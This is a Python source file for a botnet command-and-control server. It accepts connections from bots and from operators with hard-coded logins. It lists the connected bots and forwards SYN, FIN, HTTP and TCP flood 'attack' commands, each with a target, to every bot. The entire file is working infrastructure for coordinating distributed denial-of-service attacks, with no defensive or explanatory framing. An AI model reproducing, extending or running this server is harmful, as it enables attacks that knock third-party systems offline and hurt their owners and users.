import sys
import socket
import threading
import codecs
import datetime
from colorama import init, Fore, Back, Style	# for color and style

class C2Server():
	"""docstring for Chanel"""
	def __init__(self):
		self.bind_ip = '0.0.0.0'
		self.bind_port = 30497
		self.bots = []
		self.bots_info = []
		self.user=[
			{
				"username": "pmtoan",
				"password": "/"
			},
			{
				"username": "long",
				"password": "/"
			}
		]
	def log(self, log_data):
		log_file = open("c2server.log", "a")
		print(log_data, file=log_file)
		log_file.close()
	def timestamp(self):
		return str(datetime.datetime.now().time())
	def bootstrap(self):
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.bind((self.bind_ip, self.bind_port))
		soc.listen(10)
		print(Style.BRIGHT, end='')
		print(Fore.YELLOW + self.timestamp() + " Listening on port %d with %d bot" % (self.bind_port, len(self.bots)))
		print(Fore.RESET, end='')
		self.log( self.timestamp() + " Listening on port " + str(self.bind_port))
		while True:
			client_soc, addr = soc.accept()
			bot_handler = threading.Thread(target=self.bot_handler, args=(client_soc, addr,))
			bot_handler.start()
	def bot_connect(self, client_soc, addr):
		self.bots.append(client_soc)
		self.bots_info.append(addr)
		print(Fore.CYAN + self.timestamp() + " Accept connection from %s" % (str(addr)))
		print(Fore.RESET, end='')
		self.log( self.timestamp() + " Accept connection from " + str(addr))
	def c2s_handler(self, client_soc, addr, payload):
		print(Fore.RED + self.timestamp() + " Authenticating connection from mngm node %s" % (str(addr)))
		print(Fore.RESET, end='')
		cmd, userpass = payload.split("@")
		username, password = userpass.split(".")
		if (self.auth_c2s(username, password) == True):
			print(Fore.CYAN + self.timestamp() + " Accept mngm node connection from %s with username: \'%s\'" % (addr, username))
			print(Fore.RESET, end='')
			self.log(self.timestamp() + " Accept mngm node connection from " + str(addr) + " with username:" + str(username))
			client_soc.send("chn#connect@done".encode("utf8"))
			while True:
				message = client_soc.recv(1024)
				header, payload = message.decode("utf8").split("#")
				cmd, arg = payload.split("@")
				if (cmd == "exit"):
					print(Fore.CYAN + "... Disconnected with mngm node from %s with username: \'%s\'" % (addr, username))
					print(Fore.RESET, end='')
					self.log(self.timestamp() + " Disconnected with mngm node from " + str(addr) + " with username:" + str(username))
					client_soc.close()
					break
				else:
					client_soc.send(self.excute(cmd, arg).encode("utf8"))
				print( self.timestamp(), cmd, arg)
				self.log(str(self.timestamp() + cmd + arg))
		else:
			print(Fore.CYAN + self.timestamp() + " Deny mngm node connection from %s with username: \'%s\'" % (addr, username))
			self.log(self.timestamp() + "Deny mngm node connection from " + str(addr) + " with username:" + str(username))
			client_soc.send("chn#connect@faile".encode("utf8"))
	def excute(self, cmd, arg):
		status = "chn#"
		if (cmd == "show"):
			if (arg == "bots"):
				status += "bots@"
				for item in self.bots_info:
					status += str(item)
					status += "%"
				return str(status)
		elif ((cmd == "attack") | (cmd == "synattack") | (cmd == "finattack") | (cmd == "httpattack")\
		| (cmd == "tcpattack")):
			status += "attack@attacking " + arg + " with " + cmd
			for bot in self.bots:
				bot.send(("chn#" + cmd + "@" + arg).encode("utf8"))
		else:
			status += "cmd@failed"
		return status
	def auth_c2s(self, username, password):
		for usr in self.user:
			if ((username == usr["username"]) & (password == usr["password"])):
				return True
		return False
	def bot_handler(self, client_soc, addr):
		message = client_soc.recv(1024)
		header, payload = message.decode("utf8").split("#")
		if (header == "bot"):
			self.bot_connect(client_soc, addr)
		elif (header == "c2s"):
			c2s_handler = threading.Thread(target=self.c2s_handler, args=(client_soc, addr, payload))
			c2s_handler.start()

if __name__ == '__main__':
	init()	# initialize color
	chanel = C2Server()
	chanel.bootstrap()